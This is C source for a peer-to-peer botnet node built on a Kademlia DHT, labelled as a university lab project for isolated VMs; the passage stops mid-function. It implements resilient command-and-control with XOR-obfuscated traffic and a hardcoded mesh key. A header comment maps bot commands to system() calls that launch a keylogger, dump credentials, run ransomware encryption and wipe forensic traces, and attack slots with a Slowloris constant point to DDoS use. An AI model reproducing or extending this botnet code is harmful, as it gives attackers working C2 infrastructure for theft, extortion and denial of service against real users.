/*
 * ====================================================
 *  AUA CS 232/337 -- Botnet Research Project
 *  Component: Phase 3 -- Kademlia P2P DHT Botnet Node (C)
 *  FULLY SPEC-COMPLIANT
 *  ISOLATED VM LAB ONLY
 *
 *  Compile:
 *    gcc -O2 -o kademlia_p2p kademlia_p2p.c -lpthread -lssl -lcrypto -lm
 *
 *  New over previous version:
 *    + Replacement cache (paper): bucket full + oldest alive -> newcomer
 *      queued in replacements[REPLACEMENT_CACHE_SIZE]; never silently dropped
 *    + Replacement promotion on removal (jontab pattern): routing_remove()
 *      promotes newest replacement into main contact list
 *    + Per-bucket last_touched (jontab): bucket_refresh_thread only refreshes
 *      buckets untouched for > BUCKET_TTL_SEC (lazy, not blanket)
 *    + Value TTL expiry (paper §2.5): KVEntry.ttl field; kvstore_get() returns
 *      -1 on expired entries; expiry_loop thread purges every EXPIRY_CHECK_SEC
 *    + Original-publisher republishing (paper §2.5): store_value(is_original=1)
 *      tracks keys; republish_thread re-pushes every REPUBLISH_SEC (23 h)
 *    + k-closest confirmation round (paper §2.3): iterative_find_node() runs
 *      a final pass querying still-unqueried k-closest before terminating
 *    + Lookup-path caching (paper §2.5): iterative_find_value() stores result
 *      at closest non-holding path node after a successful lookup
 *    + Client/server mode (libp2p): --client flag; routing_add() rejects
 *      client-mode contacts (server_mode field on Contact)
 *    + MSG_ADD_PROVIDER (0x0A) / MSG_GET_PROVIDERS (0x0B) /
 *      MSG_PROVIDER_PEERS (0x0C) -- libp2p provider record messages
 *    + ProviderStore: per-node storage of content provider advertisements
 *    + Entry validation: g_validate / g_select function pointers applied on
 *      STORE receive and FIND_VALUE return
 *    + Quorum-based FIND_VALUE: collect QUORUM responses; g_select picks best
 *    + Periodic re-bootstrap thread: FIND_NODE on own ID every BOOTSTRAP_SEC
 * New command types (all delegate to Python modules via system()): */
/* "start_keylogger"   → system("python3 keylogger_sim.py --start &"); */
/* "stop_keylogger"    → system("python3 keylogger_sim.py --stop");    */
/* "extract_creds"     → system("python3 cred_extractor_sim.py --extract > /tmp/creds.json"); */
/* "ransom_encrypt"    → system("python3 ransomware_sim.py --setup && python3 ransomware_sim.py --encrypt"); */
/* "anti_forensics"    → system("python3 anti_forensics_sim.py --clear-lab"); */
/* "system_profile"    → system("python3 system_profiler.py --collect > /tmp/profile.json"); 
 *  Wire format (shared with p2p_node.py):
 *    HDR [35 bytes]: [1 type][8 msg_id][20 sender_id][4 ip NBO][2 port NBO]
 *    ADD_PROVIDER  (0x0A): HDR + [20 key]
 *    GET_PROVIDERS (0x0B): HDR + [20 key]
 *    PROVIDER_PEERS(0x0C): HDR + [1 pcount] + pcount*26
 *                               + [1 ccount] + ccount*26
 *    All other messages: unchanged.
 * ====================================================
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <time.h>
#include <math.h>
#include <signal.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <openssl/sha.h>

/* ── Constants ─────────────────────────────────────────────────────── */
#define ID_BYTES              20
#define K                      8
#define ALPHA                  3
#define QUORUM                 3
#define BUCKET_COUNT         160
#define MAX_SEEDS             16
#define MAX_KV_ENTRIES       256
#define MAX_VALUE_LEN       2048
#define UDP_BUF             4096
#define PING_TIMEOUT_MS     2000
#define FIND_TIMEOUT_MS     3000
#define REFRESH_SEC          300
#define BUCKET_TTL_SEC      3600
#define POLL_SEC              30
#define REPLICATE_SEC       3600
#define STATUS_SEC            60
#define MAX_ITER              20
#define EXEC_HISTORY         256
#define MAX_ATTACKS            8
#define SLOWLORIS_SOCKS      150
#define CONTACT_SIZE          26
#define HDR_SIZE              35

/* NEW */
#define VALUE_TTL              86400
#define REPUBLISH_SEC          82800
#define BOOTSTRAP_SEC            600
#define EXPIRY_CHECK_SEC        3600
#define REPLACEMENT_CACHE_SIZE    (5*K)
#define MAX_PROVIDER_RECORDS      64
#define MAX_PROVIDERS_PER_KEY      8

#define MSG_PING          0x01
#define MSG_PONG          0x02
#define MSG_FIND_NODE     0x03
#define MSG_FOUND_NODES   0x04
#define MSG_STORE         0x05
#define MSG_FIND_VALUE    0x06
#define MSG_FOUND_VALUE   0x07
#define MSG_STOP_ALL      0x08
#define MSG_SHUTDOWN      0x09
#define MSG_ADD_PROVIDER   0x0A
#define MSG_GET_PROVIDERS  0x0B
#define MSG_PROVIDER_PEERS 0x0C

static const char *P2P_SECRET  = "AUA_P2P_MESH_KEY";
static const char *COMMAND_KEY = "botnet_command_v1";

/* ── Entry validation function pointers ────────────────────────────── */
typedef int (*validate_fn)(const uint8_t *key, const char *value);
typedef int (*select_fn)(const uint8_t *key, const char **values, int count);
static int default_validate(const uint8_t *k,const char *v){(void)k;(void)v;return 1;}
static int default_select(const uint8_t *k,const char **v,int n){(void)k;(void)v;(void)n;return 0;}
static validate_fn g_validate = default_validate;
static select_fn   g_select   = default_select;

/* ── Data structures ────────────────────────────────────────────────── */
typedef uint8_t NodeID[ID_BYTES];

typedef struct {
    NodeID   id;
    uint32_t ip;
    uint16_t port;
    time_t   last_seen;
    int      fail_count;
    int      server_mode;
} Contact;

typedef struct {
    Contact  contacts[K];
    int      count;
    Contact  replacements[REPLACEMENT_CACHE_SIZE];
    int      repl_count;
    time_t   last_touched;
    pthread_mutex_t lock;
} KBucket;

typedef struct {
    KBucket  buckets[BUCKET_COUNT];
    NodeID   self_id;
} RoutingTable;

typedef struct {
    uint8_t  key[ID_BYTES];
    char     value[MAX_VALUE_LEN];
    int      value_len;
    time_t   stored_at;
    uint32_t ttl;
    int      is_original;
    int      used;
} KVEntry;

typedef struct {
    KVEntry  entries[MAX_KV_ENTRIES];
    pthread_mutex_t lock;
} KVStore;

typedef struct {
    uint8_t  key[ID_BYTES];
    Contact  providers[MAX_PROVIDERS_PER_KEY];
    int      provider_count;
    int      used;
} ProviderRecord;

typedef struct {
    ProviderRecord records[MAX_PROVIDER_RECORDS];
    pthread_mutex_t lock;
} ProviderStore;

typedef struct PendingRPC PendingRPC;
struct PendingRPC {
    uint8_t     msg_id[8];
    uint8_t     response_buf[UDP_BUF];
    int         response_len;
    int         done;
    pthread_mutex_t lock;
    pthread_cond_t  cond;
    PendingRPC *next;
};

typedef struct {
    volatile int stop;
    char   target[64];
    int    port;
    int    duration;
    double cpu;
} AttackArgs;

typedef struct {
    char      type[32];
    pthread_t tid;
    AttackArgs *args;
    int       active;
} AttackSlot;

typedef struct KademliaNode KademliaNode;
struct KademliaNode {
    int             sock;
    NodeID          self_id;
    uint32_t        self_ip;
    uint16_t        self_port;
    int             server_mode;
    RoutingTable    routing;
    KVStore         store;
    ProviderStore   pstore;
    volatile int    running;
    pthread_t       recv_tid, refresh_tid, poll_tid;
    pthread_t       replicate_tid, status_tid;
    pthread_t       bootstrap_tid, republish_tid, expiry_tid;
    PendingRPC     *pending_head;
    pthread_mutex_t pending_lock;
    uint8_t         exec_hashes[EXEC_HISTORY][ID_BYTES];
    int             exec_count;
    pthread_mutex_t exec_lock;
    AttackSlot      attacks[MAX_ATTACKS];
    pthread_mutex_t attack_lock;
    uint8_t         orig_keys[MAX_KV_ENTRIES][ID_BYTES];
    int             orig_key_count;
    pthread_mutex_t orig_keys_lock;
};

static KademliaNode *g_node = NULL;

/* ── Utilities ──────────────────────────────────────────────────────── */
static void seed_random(void){
    uint32_t s; FILE *f=fopen("/dev/urandom","rb");
    if(f){fread(&s,4,1,f);fclose(f);}else s=(uint32_t)(time(NULL)^getpid());
    srand(s);
}

static uint8_t          g_key_hash[SHA256_DIGEST_LENGTH];
static pthread_once_t   g_key_once = PTHREAD_ONCE_INIT;
static pthread_rwlock_t g_key_rwlock = PTHREAD_RWLOCK_INITIALIZER;

static void init_key_hash(void){SHA256((const uint8_t*)P2P_SECRET,strlen(P2P_SECRET),g_key_hash);}

static void rotate_p2p_key(const char *ns){
    pthread_once(&g_key_once,init_key_hash);
    uint8_t h[SHA256_DIGEST_LENGTH];
    SHA256((const uint8_t*)ns,strlen(ns),h);
    pthread_rwlock_wrlock(&g_key_rwlock);
    memcpy(g_key_hash,h,SHA256_DIGEST_LENGTH);
    pthread_rwlock_unlock(&g_key_rwlock);
}

static void xor_cipher(const uint8_t *in,uint8_t *out,size_t len){
    pthread_once(&g_key_once,init_key_hash);
    pthread_rwlock_rdlock(&g_key_rwlock);
    for(size_t i=0;i<len;i++) out[i]=in[i]^g_key_hash[i%SHA256_DIGEST_LENGTH];
    pthread_rwlock_unlock(&g_key_rwlock);
}

static void sha1_str(const char *s,NodeID out){SHA1((const uint8_t*)s,strlen(s),out);}

static void id_from_host_port(const char *host,uint16_t port_nbo,NodeID out){
    char buf[128]; snprintf(buf,sizeof(buf),"%s:%u",host,(unsigned)ntohs(port_nbo));
    sha1_str(buf,out);
}

static void rand_msg_id(uint8_t *out){for(int i=0;i<8;i++)out[i]=(uint8_t)(rand()&0xFF);}

static int resolve_host(const char *host,struct in_addr *out){
    if(inet_aton(host,out))return 0;
    struct hostent *h=gethostbyname(host);
    if(!h)return -1;
    memcpy(out,h->h_addr_list[0],sizeof(*out));return 0;
}

static uint16_t inet_cksum(const void *buf,int len){
    uint32_t sum=0; const uint16_t *p=(const uint16_t*)buf;
    while(len>1){sum+=*p++;len-=2;}
    if(len)sum+=*(const uint8_t*)p;
    while(sum>>16)sum=(sum&0xFFFF)+(sum>>16);
    return(uint16_t)~sum;
}

static int bucket_index(const NodeID a,const NodeID b){
    for(int byte=0;byte<ID_BYTES;byte++){
        uint8_t diff=a[byte]^b[byte];
        if(!diff)continue;
        for(int bit=7;bit>=0;bit--)
            if(diff&(1<<bit))return(ID_BYTES-1-byte)*8+bit;
    }
    return -1;
}

static int xor_cmp(const NodeID target,const NodeID a,const NodeID b){
    for(int i=0;i<ID_BYTES;i++){
        uint8_t da=target[i]^a[i],db=target[i]^b[i];
        if(da<db)return -1; if(da>db)return 1;
    }
    return 0;
}

/* ── Routing Table ──────────────────────────────────────────────────── */
static void routing_init(RoutingTable *rt,const NodeID sid){
    memcpy(rt->self_id,sid,ID_BYTES);
    for(int i=0;i<BUCKET_COUNT;i++){
        rt->buckets[i].count=0; rt->buckets[i].repl_count=0;
        rt->buckets[i].last_touched=time(NULL);
        pthread_mutex_init(&rt->buckets[i].lock,NULL);
    }
}

static Contact *routing_find_closest(RoutingTable *rt,const NodeID target,int n,int *out_count){
    int cap=BUCKET_COUNT*K;
    Contact *pool=malloc(cap*sizeof(Contact));
    if(!pool){*out_count=0;return NULL;}
    int total=0;
    for(int i=0;i<BUCKET_COUNT;i++){
        KBucket *b=&rt->buckets[i];
        pthread_mutex_lock(&b->lock);
        for(int j=0;j<b->count&&total<cap;j++) pool[total++]=b->contacts[j];
        pthread_mutex_unlock(&b->lock);
    }
    for(int i=1;i<total;i++){
        Contact tmp=pool[i];int j=i-1;
        while(j>=0&&xor_cmp(target,pool[j].id,tmp.id)>0){pool[j+1]=pool[j];j--;}
        pool[j+1]=tmp;
    }
    int count=(total<n)?total:n;
    Contact *r=malloc(count*sizeof(Contact));
    if(!r){free(pool);*out_count=0;return NULL;}
    memcpy(r,pool,count*sizeof(Contact));
    free(pool);*out_count=count;return r;
}

static int kademlia_ping(KademliaNode *n,uint32_t dst_ip,uint16_t dst_port);

static int routing_add(RoutingTable *rt,const Contact *c,KademliaNode *node){
    if(memcmp(c->id,rt->self_id,ID_BYTES)==0)return 0;
    if(!c->server_mode)return 0;
    int idx=bucket_index(rt->self_id,c->id);
    if(idx<0||idx>=BUCKET_COUNT)return 0;
    KBucket *b=&rt->buckets[idx];
    pthread_mutex_lock(&b->lock);
    for(int i=0;i<b->count;i++){
        if(memcmp(b->contacts[i].id,c->id,ID_BYTES)==0){
            b->contacts[i].last_seen=time(NULL); b->contacts[i].fail_count=0;
            b->last_touched=time(NULL);
            pthread_mutex_unlock(&b->lock);return 1;
        }
    }
    for(int i=0;i<b->repl_count;i++){
        if(memcmp(b->replacements[i].id,c->id,ID_BYTES)==0){
            b->replacements[i].last_seen=time(NULL);
            pthread_mutex_unlock(&b->lock);return 0;
        }
    }
    if(b->count<K){
        b->contacts[b->count++]=*c; b->last_touched=time(NULL);
        pthread_mutex_unlock(&b->lock);return 1;
    }
    Contact oldest=b->contacts[0];
    pthread_mutex_unlock(&b->lock);
    int alive=kademlia_ping(node,oldest.ip,oldest.port);
    pthread_mutex_lock(&b->lock);
    if(alive){
        Contact tmp=b->contacts[0];
        memmove(b->contacts,b->contacts+1,(K-1)*sizeof(Contact));
        b->contacts[K-1]=tmp; b->contacts[K-1].last_seen=time(NULL);
        if(b->repl_count<REPLACEMENT_CACHE_SIZE){
            b->replacements[b->repl_count++]=*c;
        } else {
            memmove(b->replacements,b->replacements+1,(REPLACEMENT_CACHE_SIZE-1)*sizeof(Contact));
            b->replacements[REPLACEMENT_CACHE_SIZE-1]=*c;
        }
        pthread_mutex_unlock(&b->lock);return 0;
    }
    memmove(b->contacts,b->contacts+1,(K-1)*sizeof(Contact));
    b->contacts[K-1]=*c; b->last_touched=time(NULL);
    pthread_mutex_unlock(&b->lock);return 1;
}

static void routing_remove(RoutingTable *rt,const NodeID id){
    int idx=bucket_index(rt->self_id,id);
    if(idx<0||idx>=BUCKET_COUNT)return;
    KBucket *b=&rt->buckets[idx];
    pthread_mutex_lock(&b->lock);
    for(int i=0;i<b->count;i++){
        if(memcmp(b->contacts[i].id,id,ID_BYTES)==0){
            memmove(&b->contacts[i],&b->contacts[i+1],(b->count-i-1)*sizeof(Contact));
            b->count--;
            if(b->repl_count>0){
                b->contacts[b->count++]=b->replacements[b->repl_count-1];
                b->repl_count--; b->last_touched=time(NULL);
            }
            break;
        }
    }
    pthread_mutex_unlock(&b->lock);
}

/* ── KV Store ───────────────────────────────────────────────────────── */
static void kvstore_init(KVStore *s){memset(s,0,sizeof(*s));pthread_mutex_init(&s->lock,NULL);}

static void kvstore_put(KVStore *s,const uint8_t *key,const char *val,int vlen,int is_orig){
    if(!g_validate(key,val))return;
    pthread_mutex_lock(&s->lock);
    int copy=(vlen<MAX_VALUE_LEN-1)?vlen:MAX_VALUE_LEN-1;
    for(int i=0;i<MAX_KV_ENTRIES;i++){
        if(s->entries[i].used&&memcmp(s->entries[i].key,key,ID_BYTES)==0){
            const char *cands[2]={s->entries[i].value,val};
            int best=g_select(key,cands,2);
            if(best==1){memcpy(s->entries[i].value,val,copy);s->entries[i].value[copy]='\0';s->entries[i].value_len=copy;}
            s->entries[i].stored_at=time(NULL);s->entries[i].ttl=VALUE_TTL;
            if(is_orig)s->entries[i].is_original=1;
            pthread_mutex_unlock(&s->lock);return;
        }
    }
    for(int i=0;i<MAX_KV_ENTRIES;i++){
        if(!s->entries[i].used){
            memcpy(s->entries[i].key,key,ID_BYTES);
            memcpy(s->entries[i].value,val,copy);s->entries[i].value[copy]='\0';
            s->entries[i].value_len=copy;s->entries[i].stored_at=time(NULL);
            s->entries[i].ttl=VALUE_TTL;s->entries[i].is_original=is_orig;s->entries[i].used=1;
            pthread_mutex_unlock(&s->lock);return;
        }
    }
    int oi=0; time_t ot=s->entries[0].stored_at;
    for(int i=1;i<MAX_KV_ENTRIES;i++){
        if(!s->entries[i].is_original&&(time(NULL)-s->entries[i].stored_at)>=(time_t)s->entries[i].ttl){oi=i;break;}
        if(s->entries[i].stored_at<ot){ot=s->entries[i].stored_at;oi=i;}
    }
    memcpy(s->entries[oi].key,key,ID_BYTES);
    memcpy(s->entries[oi].value,val,copy);s->entries[oi].value[copy]='\0';
    s->entries[oi].value_len=copy;s->entries[oi].stored_at=time(NULL);
    s->entries[oi].ttl=VALUE_TTL;s->entries[oi].is_original=is_orig;s->entries[oi].used=1;
    pthread_mutex_unlock(&s->lock);
}

static int kvstore_get(KVStore *s,const uint8_t *key,char *out,int out_len){
    pthread_mutex_lock(&s->lock);
    for(int i=0;i<MAX_KV_ENTRIES;i++){
        if(s->entries[i].used&&memcmp(s->entries[i].key,key,ID_BYTES)==0){
            if((time(NULL)-s->entries[i].stored_at)>=(time_t)s->entries[i].ttl){
                s->entries[i].used=0;pthread_mutex_unlock(&s->lock);return -1;
            }
            int copy=(s->entries[i].value_len<out_len-1)?s->entries[i].value_len:out_len-1;
            memcpy(out,s->entries[i].value,copy);out[copy]='\0';
            pthread_mutex_unlock(&s->lock);return copy;
        }
    }
    pthread_mutex_unlock(&s->lock);return -1;
}

static int kvstore_expire(KVStore *s){
    time_t now=time(NULL);int expired=0;
    pthread_mutex_lock(&s->lock);
    for(int i=0;i<MAX_KV_ENTRIES;i++)
        if(s->entries[i].used&&(now-s->entries[i].stored_at)>=(time_t)s->entries[i].ttl){
            s->entries[i].used=0;expired++;
        }
    pthread_mutex_unlock(&s->lock);return expired;
}

/* ── Provider Store ─────────────────────────────────────────────────── */
static void pstore_init(ProviderStore *ps){memset(ps,0,sizeof(*ps));pthread_mutex_init(&ps->lock,NULL);}

static void pstore_add(ProviderStore *ps,const uint8_t *key,const Contact *c){
    pthread_mutex_lock(&ps->lock);
    for(int i=0;i<MAX_PROVIDER_RECORDS;i++){
        if(ps->records[i].used&&memcmp(ps->records[i].key,key,ID_BYTES)==0){
            for(int j=0;j<ps->records[i].provider_count;j++)
                if(memcmp(ps->records[i].providers[j].id,c->id,ID_BYTES)==0){
                    ps->records[i].providers[j]=*c;pthread_mutex_unlock(&ps->lock);return;
                }
            if(ps->records[i].provider_count<MAX_PROVIDERS_PER_KEY)
                ps->records[i].providers[ps->records[i].provider_count++]=*c;
            pthread_mutex_unlock(&ps->lock);return;
        }
    }
    for(int i=0;i<MAX_PROVIDER_RECORDS;i++){
        if(!ps->records[i].used){
            memcpy(ps->records[i].key,key,ID_BYTES);
            ps->records[i].providers[0]=*c;ps->records[i].provider_count=1;ps->records[i].used=1;
            pthread_mutex_unlock(&ps->lock);return;
        }
    }
    pthread_mutex_unlock(&ps->lock);
}

static int pstore_get(ProviderStore *ps,const uint8_t *key,Contact *out,int max){
    pthread_mutex_lock(&ps->lock);
    for(int i=0;i<MAX_PROVIDER_RECORDS;i++){
        if(ps->records[i].used&&memcmp(ps->records[i].key,key,ID_BYTES)==0){
            int n=(ps->records[i].provider_count<max)?ps->records[i].provider_count:max;
            memcpy(out,ps->records[i].providers,n*sizeof(Contact));
            pthread_mutex_unlock(&ps->lock);return n;
        }
    }
    pthread_mutex_unlock(&ps->lock);return 0;
}

/* ── Wire encoding ──────────────────────────────────────────────────── */
static int encode_header(uint8_t *buf,uint8_t type,const uint8_t *msg_id,
                          const NodeID sid,uint32_t sip,uint16_t sport){
    buf[0]=type;memcpy(buf+1,msg_id,8);memcpy(buf+9,sid,ID_BYTES);
    memcpy(buf+29,&sip,4);memcpy(buf+33,&sport,2);return HDR_SIZE;
}

static void decode_header(const uint8_t *buf,uint8_t *type,uint8_t *msg_id,
                           NodeID sid,uint32_t *sip,uint16_t *sport){
    *type=buf[0];memcpy(msg_id,buf+1,8);memcpy(sid,buf+9,ID_BYTES);
    memcpy(sip,buf+29,4);memcpy(sport,buf+33,2);
}

static void send_msg(int sock,const uint8_t *raw,int len,uint32_t dip,uint16_t dport){
    if(len<=0||len>(int)UDP_BUF)return;
    uint8_t enc[UDP_BUF];xor_cipher(raw,enc,len);
    struct sockaddr_in dst={0};
    dst.sin_family=AF_INET;dst.sin_addr.s_addr=dip;dst.sin_port=dport;
    sendto(sock,enc,len,0,(struct sockaddr*)&dst,sizeof(dst));
}

/* ── Pending RPC ────────────────────────────────────────────────────── */
static PendingRPC *pending_new(const uint8_t *mid){
    PendingRPC *p=calloc(1,sizeof(PendingRPC));if(!p)return NULL;
    memcpy(p->msg_id,mid,8);pthread_mutex_init(&p->lock,NULL);pthread_cond_init(&p->cond,NULL);
    return p;
}
static void pending_add(KademliaNode *n,PendingRPC *p){
    pthread_mutex_lock(&n->pending_lock);p->next=n->pending_head;n->pending_head=p;
    pthread_mutex_unlock(&n->pending_lock);
}
static void pending_remove(KademliaNode *n,PendingRPC *p){
    pthread_mutex_lock(&n->pending_lock);PendingRPC **cur=&n->pending_head;
    while(*cur){if(*cur==p){*cur=p->next;break;}cur=&(*cur)->next;}
    pthread_mutex_unlock(&n->pending_lock);
}
static void pending_free(PendingRPC *p){pthread_mutex_destroy(&p->lock);pthread_cond_destroy(&p->cond);free(p);}
static int pending_wait(PendingRPC *p,int timeout_ms){
    struct timespec ts;clock_gettime(CLOCK_REALTIME,&ts);
    ts.tv_sec+=timeout_ms/1000;ts.tv_nsec+=(long)(timeout_ms%1000)*1000000L;
    if(ts.tv_nsec>=1000000000L){ts.tv_sec++;ts.tv_nsec-=1000000000L;}
    pthread_mutex_lock(&p->lock);
    while(!p->done)if(pthread_cond_timedwait(&p->cond,&p->lock,&ts)==ETIMEDOUT)break;
    int got=p->done;pthread_mutex_unlock(&p->lock);return got;
}

/* ── Kademlia RPCs ──────────────────────────────────────────────────── */
static int kademlia_ping(KademliaNode *n,uint32_t dip,uint16_t dport){
    uint8_t mid[8];rand_msg_id(mid);uint8_t buf[HDR_SIZE];
    encode_header(buf,MSG_PING,mid,n->self_id,n->self_ip,n->self_port);
    PendingRPC *p=pending_new(mid);if(!p)return 0;
    pending_add(n,p);send_msg(n->sock,buf,HDR_SIZE,dip,dport);
    int got=pending_wait(p,PING_TIMEOUT_MS);pending_remove(n,p);pending_free(p);return got;
}

static int kademlia_find_node_rpc(KademliaNode *n,uint32_t dip,uint16_t dport,
                                   const NodeID target,Contact *out,int max){
    uint8_t mid[8];rand_msg_id(mid);uint8_t buf[HDR_SIZE+ID_BYTES];
    int off=encode_header(buf,MSG_FIND_NODE,mid,n->self_id,n->self_ip,n->self_port);
    memcpy(buf+off,target,ID_BYTES);
    PendingRPC *p=pending_new(mid);if(!p)return 0;
    pending_add(n,p);send_msg(n->sock,buf,HDR_SIZE+ID_BYTES,dip,dport);
    int got=pending_wait(p,FIND_TIMEOUT_MS);int count=0;
    if(got&&p->response_len>=HDR_SIZE+1){
        const uint8_t *pl=p->response_buf+HDR_SIZE;int ne=pl[0];
        for(int i=0;i<ne&&i<max;i++){
            const uint8_t *e=pl+1+i*CONTACT_SIZE;
            if(e+CONTACT_SIZE>p->response_buf+p->response_len)break;
            memcpy(out[count].id,e,ID_BYTES);memcpy(&out[count].ip,e+ID_BYTES,4);
            memcpy(&out[count].port,e+ID_BYTES+4,2);
            out[count].last_seen=time(NULL);out[count].fail_count=0;out[count].server_mode=1;
            count++;
        }
    }
    pending_remove(n,p);pending_free(p);return count;
}

static int kademlia_store_rpc(KademliaNode *n,uint32_t dip,uint16_t dport,
                               const uint8_t *key,const char *value,int vlen){
    uint8_t mid[8];rand_msg_id(mid);uint16_t vln=htons((uint16_t)vlen);
    int total=HDR_SIZE+ID_BYTES+2+vlen;uint8_t *buf=malloc(total);if(!buf)return 0;
    int off=encode_header(buf,MSG_STORE,mid,n->self_id,n->self_ip,n->self_port);
    memcpy(buf+off,key,ID_BYTES);off+=ID_BYTES;memcpy(buf+off,&vln,2);off+=2;memcpy(buf+off,value,vlen);
    PendingRPC *p=pending_new(mid);if(!p){free(buf);return 0;}
    pending_add(n,p);send_msg(n->sock,buf,total,dip,dport);free(buf);
    int got=pending_wait(p,PING_TIMEOUT_MS);pending_remove(n,p);pending_free(p);return got;
}

static int kademlia_find_value_rpc(KademliaNode *n,uint32_t dip,uint16_t dport,
                                    const uint8_t *key,char *vout,int vmax,
                                    Contact *cout,int *nc){
    uint8_t mid[8];rand_msg_id(mid);uint8_t buf[HDR_SIZE+ID_BYTES];
    int off=encode_header(buf,MSG_FIND_VALUE,mid,n->self_id,n->self_ip,n->self_port);
    memcpy(buf+off,key,ID_BYTES);
    PendingRPC *p=pending_new(mid);if(!p)return 0;
    pending_add(n,p);send_msg(n->sock,buf,HDR_SIZE+ID_BYTES,dip,dport);
    int got=pending_wait(p,FIND_TIMEOUT_MS);int found=0;
    if(got&&p->response_len>=HDR_SIZE){
        uint8_t rt=p->response_buf[0];const uint8_t *pl=p->response_buf+HDR_SIZE;int plen=p->response_len-HDR_SIZE;
        if(rt==MSG_FOUND_VALUE&&plen>=ID_BYTES+2){
            uint16_t vln;memcpy(&vln,pl+ID_BYTES,2);int vl=(int)ntohs(vln);
            int copy=(vl<vmax-1)?vl:vmax-1;memcpy(vout,pl+ID_BYTES+2,copy);vout[copy]='\0';
            found=g_validate(key,vout)?1:0;
        } else if(rt==MSG_FOUND_NODES&&plen>=1&&nc&&cout){
            int cnt=pl[0];*nc=0;
            for(int i=0;i<cnt;i++){
                const uint8_t *e=pl+1+i*CONTACT_SIZE;
                if(e+CONTACT_SIZE>p->response_buf+p->response_len)break;
                memcpy(cout[*nc].id,e,ID_BYTES);memcpy(&cout[*nc].ip,e+ID_BYTES,4);
                memcpy(&cout[*nc].port,e+ID_BYTES+4,2);
                cout[*nc].last_seen=time(NULL);cout[*nc].fail_count=0;cout[*nc].server_mode=1;(*nc)++;
            }
        }
    }
    pending_remove(n,p);pending_free(p);return found;
}

static int kademlia_add_provider_rpc(KademliaNode *n,uint32_t dip,uint16_t dport,const uint8_t *key){
    uint8_t mid[8];rand_msg_id(mid);uint8_t buf[HDR_SIZE+ID_BYTES];
    int off=encode_header(buf,MSG_ADD_PROVIDER,mid,n->self_id,n->self_ip,n->self_port);
    memcpy(buf+off,key,ID_BYTES);
    PendingRPC *p=pending_new(mid);if(!p)return 0;
    pending_add(n,p);send_msg(n->sock,buf,HDR_SIZE+ID_BYTES,dip,dport);
    int got=pending_wait(p,PING_TIMEOUT_MS);pending_remove(n,p);pending_free(p);return got;
}

/* ── Iterative lookups ──────────────────────────────────────────────── */
typedef struct{KademliaNode *n;uint32_t dst_ip;uint16_t dst_port;NodeID target;Contact results[K];int n_results;} FindNodeTask;
static void *find_node_worker(void *arg){FindNodeTask *t=arg;t->n_results=kademlia_find_node_rpc(t->n,t->dst_ip,t->dst_port,t->target,t->results,K);return NULL;}
static int id_in_set(const NodeID id,const uint8_t set[][ID_BYTES],int n){for(int i=0;i<n;i++)if(memcmp(set[i],id,ID_BYTES)==0)return 1;return 0;}
static int id_in_contacts(const NodeID id,const Contact *cs,int n){for(int i=0;i<n;i++)if(memcmp(cs[i].id,id,ID_BYTES)==0)return 1;return 0;}
static void contacts_sort(Contact *cs,int n,const NodeID t){
    for(int i=1;i<n;i++){Contact tmp=cs[i];int j=i-1;while(j>=0&&xor_cmp(t,cs[j].id,tmp.id)>0){cs[j+1]=cs[j];j--;}cs[j+1]=tmp;}
}

static int iterative_find_node(KademliaNode *n,const NodeID target,Contact *result,int max){
    int nc=0;Contact *init=routing_find_closest(&n->routing,target,K,&nc);if(!init)return 0;
    Contact closest[K*2];int n_cl=(nc<K*2)?nc:K*2;memcpy(closest,init,n_cl*sizeof(Contact));free(init);
    uint8_t queried[BUCKET_COUNT*K][ID_BYTES];int nq=0;

    for(int iter=0;iter<MAX_ITER;iter++){
        FindNodeTask tasks[ALPHA];pthread_t threads[ALPHA];int qc=0;
        for(int i=0;i<n_cl&&qc<ALPHA;i++){
            if(!id_in_set(closest[i].id,queried,nq)){
                tasks[qc].n=n;tasks[qc].dst_ip=closest[i].ip;tasks[qc].dst_port=closest[i].port;
                memcpy(tasks[qc].target,target,ID_BYTES);
                if(nq<BUCKET_COUNT*K)memcpy(queried[nq++],closest[i].id,ID_BYTES);qc++;
            }
        }
        if(qc==0)break;
        for(int i=0;i<qc;i++)pthread_create(&threads[i],NULL,find_node_worker,&tasks[i]);
        for(int i=0;i<qc;i++)pthread_join(threads[i],NULL);
        int any_new=0;
        for(int i=0;i<qc;i++)for(int j=0;j<tasks[i].n_results;j++){
            Contact *nc2=&tasks[i].results[j];routing_add(&n->routing,nc2,n);
            if(!id_in_contacts(nc2->id,closest,n_cl)&&n_cl<K*2){closest[n_cl++]=*nc2;any_new=1;}
        }
        if(!any_new)break;
        contacts_sort(closest,n_cl,target);if(n_cl>K)n_cl=K;
    }

    /* k-closest confirmation round (paper §2.3) */
    {
        FindNodeTask tasks[K];pthread_t threads[K];int qc=0;
        for(int i=0;i<n_cl&&i<K;i++){
            if(!id_in_set(closest[i].id,queried,nq)){
                tasks[qc].n=n;tasks[qc].dst_ip=closest[i].ip;tasks[qc].dst_port=closest[i].port;
                memcpy(tasks[qc].target,target,ID_BYTES);
                if(nq<BUCKET_COUNT*K)memcpy(queried[nq++],closest[i].id,ID_BYTES);qc++;
            }
        }
        if(qc>0){
            for(int i=0;i<qc;i++)pthread_create(&threads[i],NULL,find_node_worker,&tasks[i]);
            for(int i=0;i<qc;i++)pthread_join(threads[i],NULL);
            for(int i=0;i<qc;i++)for(int j=0;j<tasks[i].n_results;j++){
                Contact *nc2=&tasks[i].results[j];routing_add(&n->routing,nc2,n);
                if(!id_in_contacts(nc2->id,closest,n_cl)&&n_cl<K*2)closest[n_cl++]=*nc2;
            }
            contacts_sort(closest,n_cl,target);if(n_cl>K)n_cl=K;
        }
    }

    int out=(n_cl<max)?n_cl:max;memcpy(result,closest,out*sizeof(Contact));return out;
}

/* quorum FIND_VALUE with entry correction and path caching */
typedef struct{KademliaNode *n;uint32_t dst_ip;uint16_t dst_port;uint8_t key[ID_BYTES];char found_val[MAX_VALUE_LEN];int found;Contact closer[K];int n_closer;} FindValueTask;
static void *find_value_worker(void *arg){FindValueTask *t=arg;t->found=kademlia_find_value_rpc(t->n,t->dst_ip,t->dst_port,t->key,t->found_val,MAX_VALUE_LEN,t->closer,&t->n_closer);return NULL;}

static int iterative_find_value(KademliaNode *n,const uint8_t *key,char *vout,int vmax){
